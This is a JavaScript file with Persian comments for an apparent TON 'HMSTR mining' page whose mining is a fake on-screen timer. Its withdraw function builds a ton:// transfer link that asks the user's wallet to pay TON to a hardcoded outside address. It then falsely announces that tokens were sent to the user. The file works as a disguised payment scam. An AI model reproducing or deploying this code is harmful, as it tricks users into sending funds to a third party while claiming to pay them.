// TON Web setup
const tonweb = new TonWeb(new TonWeb.HttpProvider('https://testnet.toncenter.com/api/v2/jsonRPC'));
const wallet = tonweb.wallet.create({ publicKey: 'YOUR_PUBLIC_KEY' }); // کیف پول کاربر
const hmstrTokenAddress = 'HMSTR_TOKEN_CONTRACT_ADDRESS';  // آدرس قرارداد توکن HMSTR

let totalMined = 0; // مقدار کل استخراج شده
let startTime = null; // زمان شروع استخراج
let miningInterval = null; // اینترال برای آپدیت کردن مقدار استخراج
let miningSpeed = 0.001; // سرعت استخراج اولیه (0.001 توکن در ثانیه)

// آدرس کیف پول مقصد (برای مثال، آدرس Tonkeeper)
const targetWallet = 'UQBGPcjpLyLOkCjdMt2mw-f1adTJZZTV4AOwM90edhSRjjN3';

// تابع شروع استخراج
function startMining() {
    const amount = document.getElementById('amount').value;
    const resultDiv = document.getElementById('result');
    const speedDiv = document.getElementById('speed');
    const minedDiv = document.getElementById('mined');

    // اعتبارسنجی مقدار وارد شده
    if (!amount || isNaN(amount) || amount <= 0) {
        resultDiv.innerHTML = 'Please enter a valid amount of HMSTR tokens.';
        return;
    }

    // زمانی که استخراج شروع شده است
    startTime = Date.now();

    // تابع به‌روزرسانی سرعت استخراج
    miningInterval = setInterval(function() {
        const elapsedTimeInSeconds = (Date.now() - startTime) / 1000; // زمان گذشته به ثانیه
        const tokensMined = miningSpeed * elapsedTimeInSeconds; // مقدار توکن استخراج‌شده بر اساس زمان

        // به روز رسانی اطلاعات
        totalMined = Math.min(tokensMined, 30); // از 30 توکن بیشتر استخراج نمی‌شود

        speedDiv.innerHTML = `Mining Speed: ${miningSpeed.toFixed(5)} tokens/hour`;
        minedDiv.innerHTML = `Total Mined: ${totalMined.toFixed(5)} HMSTR`;

        // اگر استخراج کامل شد
        if (totalMined >= 30) {
            clearInterval(miningInterval);
            resultDiv.innerHTML = 'Mining complete! You have mined 30 HMSTR tokens.';
        }
    }, 100); // به‌روزرسانی هر 100 میلی‌ثانیه (برای روان بودن انیمیشن)
}

// تابع افزایش سرعت استخراج (Boost)
function boostMining() {
    const boostAmount = document.getElementById('amount').value;
    if (!boostAmount || isNaN(boostAmount) || boostAmount <= 0) {
        alert('Please enter a valid amount to boost mining.');
        return;
    }

    // افزایش 1 درصدی سرعت استخراج
    const boostPercentage = 0.01; // افزایش 1 درصد
    miningSpeed += miningSpeed * boostPercentage;

    // انیمیشن Boost
    const boostBtn = document.querySelector('.boost-btn');
    boostBtn.classList.add('boost-animation');
    setTimeout(() => {
        boostBtn.classList.remove('boost-animation');
    }, 1000); // انیمیشن یک ثانیه‌ای

    alert(`Mining speed boosted by 1%! Current speed: ${miningSpeed.toFixed(5)} tokens/hour`);

    // به روز رسانی اطلاعات
    document.getElementById('speed').innerText = `Mining Speed: ${miningSpeed.toFixed(5)} tokens/hour`;
}

// تابع برداشت
function withdraw() {
    if (totalMined > 0) {
        alert(`Withdrawing ${totalMined.toFixed(5)} HMSTR tokens to wallet ${targetWallet}`);
        // ارسال توکن‌ها به کیف پول Tonkeeper
        sendTokensToTonkeeper(totalMined);
    } else {
        alert('No tokens to withdraw!');
    }
}

// ارسال توکن به کیف پول Tonkeeper
function sendTokensToTonkeeper(amount) {
    // فرمت URL پروتکل Tonkeeper
    const tonkeeperUrl = `ton://transfer/${targetWallet}?amount=${Math.round(amount * 1e9)}&text=HMSTR+withdrawal`;

    // باز کردن لینک برای هدایت کاربر به کیف پول
    window.location.href = tonkeeperUrl;

    // پیام تایید
    alert(`Tokens have been sent to your Tonkeeper wallet. Amount: ${amount} HMSTR`);
}
